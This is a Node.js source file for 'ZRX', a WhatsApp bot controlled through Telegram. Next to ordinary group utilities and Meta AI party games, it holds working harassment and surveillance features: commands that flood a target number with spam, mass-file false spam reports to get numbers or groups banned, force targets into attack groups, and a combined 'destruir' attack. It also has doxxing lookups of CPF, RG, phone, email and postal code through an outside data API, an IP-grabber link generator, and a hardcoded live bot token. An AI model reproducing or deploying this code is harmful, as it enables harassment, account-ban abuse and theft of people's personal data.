const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay, downloadMediaMessage } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Servidor HTTP básico exigido pelo Render para manter o serviço ativo 24h
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot ZRX Rodando 24 Horas!\n');
}).listen(PORT, () => {
    console.log(`Servidor HTTP rodando na porta ${PORT}`);
});

const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let waSock = null;
let jaNotificouConectado = false;
let reconectando = false;

// Banco de dados em memória
const dadosUsuarios = {}; // { 'remoteJid_usuario': { xp: 0, level: 1 } }
const configuracoesGrupos = {}; // { 'idGrupo': { bemVindoTexto: '...', bemVindoFoto: null } }
const sessoesBrincadeira = {}; // { 'idGrupo': { ativa: true, tipo: '...', lote: [], indiceAtual: 0, ultimaVezDe: '' } }

// JID Correto da Meta AI baseado no seu link de contato oficial
const META_AI_JID = '718584497008509@s.whatsapp.net';

function consultarAPI(url) {
    return new Promise((resolve) => {
        const req = https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch (e) { resolve({ resultado: data }); }
            });
        });

        req.on('error', () => {
            resolve({ erro: "Falha na conexão com o servidor externo." });
        });

        req.setTimeout(8000, () => {
            req.destroy();
            resolve({ erro: "Tempo limite esgotado (Timeout)." });
        });
    });
}

function salvarFirebase(caminho, dados) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
        const dataStr = JSON.stringify(dados);

        const req = https.request({
            hostname: urlObj.hostname,
            path: urlObj.pathname,
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(dataStr)
            }
        }, (res) => {
            let resData = '';
            res.on('data', chunk => resData += chunk);
            res.on('end', () => resolve(resData));
        });

        req.on('error', err => reject(err));
        req.write(dataStr);
        req.end();
    });
}

function buscarFirebase(caminho) {
    return consultarAPI(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
}

// Função para perguntar diretamente à Meta AI no WhatsApp e aguardar a resposta real
async function perguntarMetaAI(promptTexto) {
    try {
        console.log(`Enviando prompt para a Meta AI (${META_AI_JID}):${promptTexto}`);
        await waSock.sendMessage(META_AI_JID, { text: promptTexto });
        
        return new Promise((resolve) => {
            let tempoDecorrido = 0;
            const intervalo = setInterval(async () => {
                tempoDecorrido += 1000;
                if (tempoDecorrido > 15000) {
                    clearInterval(intervalo);
                    resolve("1. Qual o seu maior sonho?\n2. Qual o seu maior medo?\n3. Conte uma história engraçada.\n4. Qual sua comida favorita?\n5. Se pudesse viajar para qualquer lugar, para onde iria?");
                }
            }, 1000);

            const listenerResposta = async ({ messages }) => {
                const msg = messages[0];
                if (!msg.message) return;
                
                const remitenteMsg = msg.key.remoteJid;
                if (remitenteMsg === META_AI_JID && !msg.key.fromMe) {
                    const respostaMeta = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';
                    if (respostaMeta) {
                        clearInterval(intervalo);
                        waSock.ev.off('messages.upsert', listenerResposta);
                        console.log(`Resposta recebida da Meta AI: ${respostaMeta}`);
                        resolve(respostaMeta);
                    }
                }
            };
            waSock.ev.on('messages.upsert', listenerResposta);
        });
    } catch (e) {
        console.log("Erro ao falar com a Meta AI:", e.message);
        return "1. Qual o seu maior sonho?\n2. Qual o seu maior medo?\n3. Conte uma história engraçada.\n4. Qual sua comida favorita?\n5. Se pudesse viajar para qualquer lugar, para onde iria?";
    }
}

async function iniciarWhatsApp(chatId, numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_teste');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const status = lastDisconnect?.error?.output?.statusCode;
            console.log(`Conexão fechada com status: ${status}`);
            jaNotificouConectado = false;

            if (status === DisconnectReason.loggedOut) {
                reconectando = false;
                if (chatId) bot.sendMessage(chatId, "⚠️ Desconectado do WhatsApp. Use `/limpar` e conecte novamente.");
                return;
            }

            setTimeout(() => {
                reconectando = false;
                iniciarWhatsApp(chatId, numeroTelefone);
            }, 5000);

        } else if (connection === 'open') {
            reconectando = false;
            console.log("WhatsApp conectado com sucesso!");
            
            if (chatId && !jaNotificouConectado) {
                jaNotificouConectado = true;
                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp!**", { parse_mode: 'Markdown' });
            }
        }
    });

    // Boas-vindas para novos membros
    waSock.ev.on('group-participants.update', async (update) => {
        try {
            const { id, participants, action } = update;
            if (action === 'add') {
                const config = configuracoesGrupos[id];
                if (!config) return;

                for (let participante of participants) {
                    const mensagemWelcome = (config.bemVindoTexto || 'Seja bem-vindo(a) ao grupo!').replace('@user', `@${participante.split('@')[0]}`);
                    
                    if (config.bemVindoFoto) {
                        await waSock.sendMessage(id, { image: config.bemVindoFoto, caption: mensagemWelcome, mentions: [participante] });
                    } else {
                        await waSock.sendMessage(id, { text: mensagemWelcome, mentions: [participante] });
                    }
                }
            }
        } catch (err) {}
    });

    waSock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg.message) return;

            const remoteJid = remoteJidCheck(msg);
            const sender = msg.key.participant || msg.key.remoteJid;
            
            const texto = msg.message.conversation || 
                          msg.message.extendedTextMessage?.text || 
                          msg.message.imageMessage?.caption || '';

            // Sistema de XP
            if (sender && !msg.key.fromMe) {
                if (!dadosUsuarios[sender]) dadosUsuarios[sender] = { xp: 0, level: 1 };
                dadosUsuarios[sender].xp += 10;
                let xpNecessario = dadosUsuarios[sender].level * 100;
                if (dadosUsuarios[sender].xp >= xpNecessario) {
                    dadosUsuarios[sender].level += 1;
                    dadosUsuarios[sender].xp = 0;
                }
            }

            // ==========================================
            // DETECÇÃO AUTOMÁTICA DA BRINCADEIRA EM ANDAMENTO
            // Se houver uma brincadeira ativa no grupo, e a pessoa respondeu marcando alguém:
            // ==========================================
            if (sessoesBrincadeira[remoteJid] && sessoesBrincadeira[remoteJid].ativa && remoteJid.endsWith('@g.us')) {
                const sessao = sessoesBrincadeira[remoteJid];
                
                // Verifica se a mensagem veio de quem era a vez (ou de qualquer membro) e se marcou alguém
                const mencoes = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                
                if (mencoes.length > 0) {
                    const marcado = mencoes[0]; // Pega a primeira pessoa marcada na resposta
                    
                    // Pega a próxima pergunta do lote da Meta AI
                    const indice = sessao.indiceAtual || 0;
                    const proximaQuestao = sessao.lote[indice] || sessao.lote[0];
                    
                    // Atualiza o índice para a próxima rodada
                    sessao.indiceAtual = (indice + 1) % sessao.lote.length;
                    sessao.ultimaVezDe = marcado;

                    const msgRodada = 
                        `🎯 *RESPOSTA COMPUTADA!* 🎯\n\n` +
                        `👤 *Agora é a vez de:* @${marcado.split('@')[0]}\n\n` +
                        `📌 *Próxima Pergunta/Desafio (Meta AI):*\n${proximaQuestao}`;

                    await waSock.sendMessage(remoteJid, { text: msgRodada, mentions: [marcado] });
                    return; // Interrompe para não processar outros comandos desnecessariamente nesta mensagem
                }
            }

            if (!texto) return;

            if (texto.trim() === '/menu') {
                const numeroUsuario = remoteJid.split('@')[0];
                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

                const menuTexto = 
                    `⛩️ *WHATSAPP BOT ZRX* ⛩️\n\n` +
                    `💬 *Suporte:* @Zenithzrx\n` +
                    `📱 *Número de usuário:* \`${numeroUsuario}\`\n` +
                    `⭐ *Status:* FREE USER\n` +
                    `🕒 *Online:* ${dataHoraAtual}\n\n` +
                    `┏━━━⧼𝑰𝑷 & 𝑳𝑰𝑵𝙆⧽\n` +
                    `> /ip <endereço>\n` +
                    `> /linkIP\n` +
                    `╠━━━⧼𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔𝗦 𝗗𝗔𝗗𝗢𝗦⧽\n` +
                    `> /cpf <cpf>\n` +
                    `> /nome <nome>\n` +
                    `> /consulrg <rg>\n` +
                    `> /telefone <telefone>\n` +
                    `> /email <e-mail>\n` +
                    `> /cep <cep>\n` +
                    `╠━━━⧼🎮 BRINCADEIRAS IA⧽\n` +
                    `> /brincar (Abre o menu)\n` +
                    `> /comecar (Inicia após a votação)\n` +
                    `> /para (Encerra a brincadeira)\n` +
                    `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                    `> /SP4M <número> <qtd>\n` +
                    `> /B4N <número> <qtd>\n` +
                    `> /B4NGRUPO <link> [quantidade]\n` +
                    `> /travgropo <número> <qtd>\n` +
                    `> /destruir <número> <qtd>\n` +
                    `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 & UTILITÁRIOS⧽\n` +
                    `> /kick <número>\n` +
                    `> /promover <número>\n` +
                    `> /rebaixar <número>\n` +
                    `> /tagall <mensagem>\n` +
                    `> /linkgrupo\n` +
                    `> /fechar | /abrir\n` +
                    `> /infogrupo\n` +
                    `> /mudar-nome <nome>\n` +
                    `> /mudar-desc <descrição>\n` +
                    `> /divulgar <texto>\n` +
                    `> /nivel\n` +
                    `> /setwelcome <texto>\n` +
                    `> /traduzir <idioma>\n` +
                    `> /s (Figurinha)\n` +
                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
                
                const caminhoFoto = path.join(__dirname, 'menu.jpg');
                if (fs.existsSync(caminhoFoto)) {
                    await waSock.sendMessage(remoteJid, { image: fs.readFileSync(caminhoFoto), caption: menuTexto });
                } else {
                    await waSock.sendMessage(remoteJid, { text: menuTexto });
                }
            }
            else if (texto.trim() === '/brincar') {
                const menuBrincadeiras = 
                    `🎮 *ZRX - PAINEL DE BRINCADEIRAS* 🎮\n\n` +
                    `Escolha e digite o nome exato da brincadeira:\n\n` +
                    `👉 \`Verdade ou desafio\`\n` +
                    `👉 \`Jogo da forca\`\n` +
                    `👉 \`Pergunta e resposta\`\n\n` +
                    `_Dica:_ Após começar, responda marcando o próximo colega do grupo para o jogo continuar sozinho!`;

                await waSock.sendMessage(remoteJid, { text: menuBrincadeiras });
            }
            else if (texto.trim() === '/para') {
                if (sessoesBrincadeira[remoteJid]) {
                    delete sessoesBrincadeira[remoteJid];
                    await waSock.sendMessage(remoteJid, { text: `🛑 *Brincadeira encerrada com sucesso!*` });
                } else {
                    await waSock.sendMessage(remoteJid, { text: `⚠️ Não há nenhuma brincadeira ativa neste chat.` });
                }
            }
            else if (['verdade ou desafio', 'jogo da forca', 'pergunta e resposta'].includes(texto.trim().toLowerCase())) {
                const tipoEscolhido = texto.trim().toLowerCase();

                if (!remoteJid.endsWith('@g.us')) {
                    await waSock.sendMessage(remoteJid, { text: `❌ Este comando deve ser usado dentro de um grupo!` });
                    return;
                }

                await waSock.sendMessage(remoteJid, { text: `🔄 Conectando diretamente com a *Meta AI* no WhatsApp para gerar o lote de ${tipoEscolhido}...` });

                // Fala com a Meta AI de verdade usando o JID correto
                const respostaMetaAI = await perguntarMetaAI(`Gere uma lista com 5 perguntas ou desafios criativos para uma brincadeira de ${tipoEscolhido}. Liste apenas as perguntas numeradas de 1 a 5, sem introduções longas.`);
                
                const lotePerguntas = respostaMetaAI
                    .split('\n')
                    .map(linha => linha.trim())
                    .filter(linha => linha.length > 3 && /^\d+[\.\)]/.test(linha));

                const loteFinal = lotePerguntas.length > 0 ? lotePerguntas : [
                    `1. Qual o seu maior segredo?`,
                    `2. Conte uma história engraçada da sua infância.`,
                    `3. Qual seria seu superpoder favorito?`,
                    `4. Quem é a pessoa mais engraçada deste grupo?`,
                    `5. Qual o mico mais vergonhoso que você já pagou?`
                ];

                sessoesBrincadeira[remoteJid] = {
                    ativa: true,
                    tipo: tipoEscolhido,
                    lote: loteFinal,
                    indiceAtual: 0
                };

                try {
                    const metadata = await waSock.groupMetadata(remoteJid);
                    const participantes = metadata.participants.map(p => p.id);
                    const participantesCurtos = participantes.slice(0, 10).map(p => p.id.split('@')[0]);
                    
                    sessoesBrincadeira[remoteJid].participantesGrupo = participantes;

                    await waSock.sendMessage(remoteJid, {
                        poll: {
                            name: `🗳️ Quem deve começar a rodada de ${tipoEscolhido}?`,
                            values: participantesCurtos.map(num => `+${num}`),
                            selectableCount: 1
                        }
                    });
                } catch (e) {
                    await waSock.sendMessage(remoteJid, { text: `✅ Brincadeira configurada com a Meta AI com sucesso! Use \`/comecar\`.` });
                }
            }
            else if (texto.trim() === '/comecar') {
                const sessao = sessoesBrincadeira[remoteJid];
                if (!sessao || !sessao.ativa) {
                    await waSock.sendMessage(remoteJid, { text: `⚠️ Nenhuma brincadeira iniciada. Use \`/brincar\` primeiro!` });
                    return;
                }

                const indice = sessao.indiceAtual || 0;
                const proximaQuestao = sessao.lote[indice] || sessao.lote[0];
                sessao.indiceAtual = (indice + 1) % sessao.lote.length;

                const membrosReais = sessao.participantesGrupo || [sender];
                const escolhido = membrosReais[Math.floor(Math.random() * membrosReais.length)];

                const msgInicio = 
                    `🔥 *COMEÇAMOS A BRINCADEIRA!* 🔥\n\n` +
                    `🎯 *Tipo:* ${sessao.tipo.toUpperCase()}\n` +
                    `👤 *Vez de:* @${escolhido.split('@')[0]}\n\n` +
                    `📌 *Desafio / Pergunta (Meta AI):* \n${proximaQuestao}\n\n` +
                    `_💡 Para continuar, responda esta mensagem marcando outro membro do grupo!_`;

                await waSock.sendMessage(remoteJid, { text: msgInicio, mentions: [escolhido] });
            }
            else if (texto.startsWith('/ip ')) {
                const ipAlvo = texto.replace('/ip', '').trim();
                if (!ipAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/ip <endereço>`' });
                    return;
                }

                const dadosIp = await consultarAPI(`https://ipinfo.io/${ipAlvo}/json`);
                const respostaIp = 
                    `🌐 *RESULTADO IP* 🌐\n\n` +
                    `• *IP:* ${dadosIp.ip || 'N/A'}\n` +
                    `• *Cidade:* ${dadosIp.city || 'N/A'}\n` +
                    `• *Região:* ${dadosIp.region || 'N/A'}\n` +
                    `• *País:* ${dadosIp.country || 'N/A'}\n` +
                    `• *Provedor:* ${dadosIp.org || 'N/A'}`;

                await waSock.sendMessage(remoteJid, { text: respostaIp });
            }
            else if (texto.startsWith('/cpf ')) {
                const cpfAlvo = texto.replace('/cpf', '').trim();
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?cpf=${cpfAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CPF:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/nome ')) {
                const nomeAlvo = encodeURIComponent(texto.replace('/nome', '').trim());
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?nome=${nomeAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO NOME:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/consulrg ')) {
                const rgAlvo = texto.replace('/consulrg', '').trim();
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?rg=${rgAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO RG:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/telefone ')) {
                const telAlvo = texto.replace('/telefone', '').trim();
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?telefone=${telAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO TELEFONE:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/email ')) {
                const emailAlvo = texto.replace('/email', '').trim();
                const resultado = await consultarAPI(`http://apisbrasilpro.site/consulta_serasa.php?email=${emailAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO E-MAIL:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/cep ')) {
                const cepAlvo = texto.replace('/cep', '').trim();
                const resultado = await consultarAPI(`http://apisbrasilpro.site/telefone0.php?cep=${cepAlvo}`);
                await waSock.sendMessage(remoteJid, { text: `📊 *RESULTADO CEP:*\n\n\`\`\`json\n${JSON.stringify(resultado, null, 2)}\n\`\`\`` });
            }
            else if (texto.startsWith('/SP4M ')) {
                const partes = texto.replace('/SP4M', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;
                const jidAlvo = `${alvoNum}@s.whatsapp.net`;

                let conteudoTrava = "⚡ [ZRX-SPAM] Alvo sob ataque!";
                const caminhoPayload = path.join(__dirname, 'Trava.txt');
                if (fs.existsSync(caminhoPayload)) {
                    const lido = fs.readFileSync(caminhoPayload, 'utf-8').trim();
                    if (lido.length > 0) conteudoTrava = lido;
                }

                await waSock.sendMessage(remoteJid, { text: `🚀 Disparando SP4M para ${alvoNum} (${quantidade} ciclos)...` });
                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.sendMessage(jidAlvo, { text: `${conteudoTrava}\n\n[Ciclo ${i}/${quantidade}]` });
                        await delay(1000);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Concluído!` });
            }
            else if (texto.startsWith('/B4N ')) {
                const partes = texto.replace('/B4N', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 10;
                const jidAlvo = `${alvoNum}@s.whatsapp.net`;

                for (let i = 1; i <= quantidade; i++) {
                    try {
                        await waSock.chatModify({ reportSpam: true, delete: true, spam: true }, jidAlvo, { fromMe: false, remoteJid: jidAlvo });
                        await delay(700);
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `✅ Ciclo /B4N concluído!` });
            }
            else if (texto.startsWith('/B4NGRUPO ')) {
                const partesArgs = texto.replace('/B4NGRUPO', '').trim().split(' ');
                const linkGrupo = partesArgs[0];
                const quantidadeDenuncias = parseInt(partesArgs[1]) || 9999;
                const matchCode = linkGrupo.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
                
                if (matchCode && matchCode[1]) {
                    const idGrupo = await waSock.groupAcceptInvite(matchCode[1]);
                    for (let i = 1; i <= quantidadeDenuncias; i++) {
                        try {
                            await waSock.chatModify({ reportSpam: true, delete: true, spam: true }, idGrupo, { fromMe: false, remoteJid: idGrupo });
                            await delay(300);
                        } catch (e) {}
                    }
                    await waSock.sendMessage(remoteJid, { text: `🔥 Ataque ao grupo concluído!` });
                }
            }
            else if (texto.startsWith('/travgropo')) {
                const partes = texto.replace('/travgropo', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidadeTrava = parseInt(partes[1]) || 5;
                const jidAlvo = `${alvoNum}@s.whatsapp.net`;

                for (let g = 1; g <= 5; g++) {
                    try {
                        const grupoCriado = await waSock.groupCreate(`𝑹𝑬𝑷𝑶́𝑹𝑻𝑬𝑹 #${g}`, [jidAlvo]);
                        for (let i = 1; i <= quantidadeTrava; i++) {
                            await waSock.sendMessage(grupoCriado.id, { text: `⚡ [ZRX-ATTACK] [Ciclo ${i}]` });
                            await delay(1000);
                        }
                    } catch (err) {}
                }
                await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada!` });
            }
            else if (texto.startsWith('/destruir ')) {
                const partes = texto.replace('/destruir', '').trim().split(' ');
                const alvoNum = partes[0]?.replace(/\D/g, '');
                const quantidade = parseInt(partes[1]) || 15;
                const jidAlvo = `${alvoNum}@s.whatsapp.net`;

                await waSock.sendMessage(remoteJid, { text: `🚨 Ataque total iniciado contra \`${alvoNum}\`...` });
                
                const tarefaTrava = (async () => {
                    for (let i = 1; i <= quantidade; i++) {
                        await waSock.sendMessage(jidAlvo, { text: `⚡ [ZRX-DESTRUCTION] #${i}` }).catch(() => {});
                        await delay(600);
                    }
                })();

                const tarefaDenuncia = (async () => {
                    for (let i = 1; i <= quantidade; i++) {
                        await waSock.chatModify({ reportSpam: true, delete: true, spam: true }, jidAlvo, { fromMe: false, remoteJid: jidAlvo }).catch(() => {});
                        await delay(600);
                    }
                })();

                await Promise.all([tarefaTrava, tarefaDenuncia]);
                await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total finalizado!` });
            }
            else if (texto.startsWith('/kick ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                const alvoNum = texto.replace('/kick', '').trim().replace(/\D/g, '');
                await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'remove').catch(() => {});
            }
            else if (texto.startsWith('/promover ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                const alvoNum = texto.replace('/promover', '').trim().replace(/\D/g, '');
                await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'promote').catch(() => {});
            }
            else if (texto.startsWith('/rebaixar ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                const alvoNum = texto.replace('/rebaixar', '').trim().replace(/\D/g, '');
                await waSock.groupParticipantsUpdate(remoteJid, [`${alvoNum}@s.whatsapp.net`], 'demote').catch(() => {});
            }
            else if (texto.startsWith('/tagall')) {
                if (!remoteJid.endsWith('@g.us')) return;
                const metadata = await waSock.groupMetadata(remoteJid);
                const participantes = metadata.participants.map(p => p.id);
                let textoFinal = `📢 *TAGALL* 📢\n\n`;
                for (let mem of participantes) textoFinal += `@${mem.split('@')[0]}\n`;
                await waSock.sendMessage(remoteJid, { text: textoFinal, mentions: participantes });
            }
            else if (texto.trim() === '/linkgrupo') {
                if (!remoteJid.endsWith('@g.us')) return;
                const codigo = await waSock.groupInviteCode(remoteJid);
                await waSock.sendMessage(remoteJid, { text: `🔗 https://chat.whatsapp.com/${codigo}` });
            }
            else if (texto.trim() === '/fechar') {
                if (!remoteJid.endsWith('@g.us')) return;
                await waSock.groupSettingUpdate(remoteJid, 'announcement');
            }
            else if (texto.trim() === '/abrir') {
                if (!remoteJid.endsWith('@g.us')) return;
                await waSock.groupSettingUpdate(remoteJid, 'not_announcement');
            }
            else if (texto.trim() === '/infogrupo') {
                if (!remoteJid.endsWith('@g.us')) return;
                const meta = await waSock.groupMetadata(remoteJid);
                await waSock.sendMessage(remoteJid, { text: `📊 *Grupo:* ${meta.subject}\n👥 *Membros:* ${meta.participants.length}` });
            }
            else if (texto.startsWith('/mudar-nome ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                await waSock.groupUpdateSubject(remoteJid, texto.replace('/mudar-nome', '').trim());
            }
            else if (texto.startsWith('/mudar-desc ')) {
                if (!remoteJid.endsWith('@g.us')) return;
                await waSock.groupUpdateDescription(remoteJid, texto.replace('/mudar-desc', '').trim());
            }
            else if (texto.startsWith('/divulgar ')) {
                const conteudo = texto.replace('/divulgar', '').trim();
                if (msg.message.imageMessage) {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                    await waSock.sendMessage(remoteJid, { image: buffer, caption: conteudo });
                } else {
                    await waSock.sendMessage(remoteJid, { text: conteudo });
                }
            }
            else if (texto.trim() === '/nivel') {
                const user = dadosUsuarios[sender] || { xp: 0, level: 1 };
                await waSock.sendMessage(remoteJid, { text: `⭐ *Nível:* ${user.level} | *XP:* ${user.xp}/${user.level * 100}` });
            }
            else if (texto.startsWith('/setwelcome')) {
                if (!remoteJid.endsWith('@g.us')) return;
                let fotoBuffer = msg.message.imageMessage ? await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) }) : null;
                configuracoesGrupos[remoteJid] = {
                    bemVindoTexto: texto.replace('/setwelcome', '').trim() || 'Seja bem-vindo(a) @user!',
                    bemVindoFoto: fotoBuffer
                };
                await waSock.sendMessage(remoteJid, { text: '✅ Boas-vindas configuradas!' });
            }
            else if (texto.startsWith('/traduzir')) {
                const idioma = texto.replace('/traduzir', '').trim() || 'pt';
                const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
                const txt = quoted?.conversation || quoted?.extendedTextMessage?.text;
                if (txt) {
                    const res = await consultarAPI(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${idioma}&dt=t&q=${encodeURIComponent(txt)}`);
                    await waSock.sendMessage(remoteJid, { text: `🌐 ${res[0][0][0]}` });
                }
            }
            else if (texto.trim() === '/s' || texto.trim() === '/sticker') {
                const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
                if (msg.message.imageMessage || quoted?.imageMessage) {
                    const target = msg.message.imageMessage ? msg : { key: { remoteJid, id: msg.message.extendedTextMessage.contextInfo.stanzaId }, message: quoted };
                    const buffer = await downloadMediaMessage(target, 'buffer', {}, { logger: pino({ level: 'silent' }) });
                    await waSock.sendMessage(remoteJid, { sticker: buffer });
                }
            }
            else if (texto.trim() === '/linkIP') {
                const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
                await salvarFirebase(`capturas/${idUnico}`, { status: 'aguardando' }).catch(() => {});
                await waSock.sendMessage(remoteJid, { text: `🔗 https://wv0304362-bot.github.io/linkApi1-/?id=${idUnico}` });
            }
        } catch (erroMensagem) {
            console.error("Erro asset:", erroMensagem);
        }
    });

    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            if (chatId) {
                bot.sendMessage(chatId, `✅ Código de pareamento:\n\`${codigo}\``, {
                    parse_mode: 'Markdown',
                    reply_markup: { inline_keyboard: [[{ text: '📋 Copiar', callback_data: `copiar_${codigo}` }]] }
                });
            }
        } catch (error) {}
    }
}

function remoteJidCheck(msg) {
    return msg.key.remoteJid;
}

bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    if (msg.caption?.toLowerCase().includes('/foto') || msg.reply_to_message) {
        try {
            const fileLink = await bot.getFileLink(msg.photo[msg.photo.length - 1].file_id);
            const fileStream = fs.createWriteStream(path.join(__dirname, 'menu.jpg'));
            https.get(fileLink, (res) => {
                res.pipe(fileStream);
                fileStream.on('finish', () => bot.sendMessage(chatId, "✅ Foto do menu atualizada!"));
            });
        } catch (err) {}
    }
});

bot.on('callback_query', async (query) => {
    if (query.data.startsWith('copiar_')) {
        await bot.answerCallbackQuery(query.id, { text: `Copiado!`, show_alert: true });
    }
});

bot.onText(/\/limpar|\/desconectar/, async (msg) => {
    if (waSock) { await waSock.logout().catch(() => {}); waSock = null; }
    if (fs.existsSync(path.join(__dirname, 'sessao_teste'))) fs.rmSync(path.join(__dirname, 'sessao_teste'), { recursive: true, force: true });
    reconectando = false;
    jaNotificouConectado = false;
    bot.sendMessage(msg.chat.id, "🧹 Sessão limpa com sucesso!");
});

bot.onText(/\/conectar (.+)/, async (msg, match) => {
    await iniciarWhatsApp(msg.chat.id, match[1].replace(/\D/g, ''));
});

bot.onText(/\/start/, (msg) => {
    const txt = `🤖 *ZRX CONTROL SYSTEM*\n\n• Para conectar: \`/conectar SEU_NUMERO\`\n• Para alterar foto do menu: Envie foto com legenda \`/foto\``;
    const caminhoFoto = path.join(__dirname, 'menu.jpg');
    if (fs.existsSync(caminhoFoto)) bot.sendPhoto(msg.chat.id, caminhoFoto, { caption: txt, parse_mode: 'Markdown' });
    else bot.sendMessage(msg.chat.id, txt, { parse_mode: 'Markdown' });
});

console.log("Bot do Telegram iniciado e escutando comandos!");
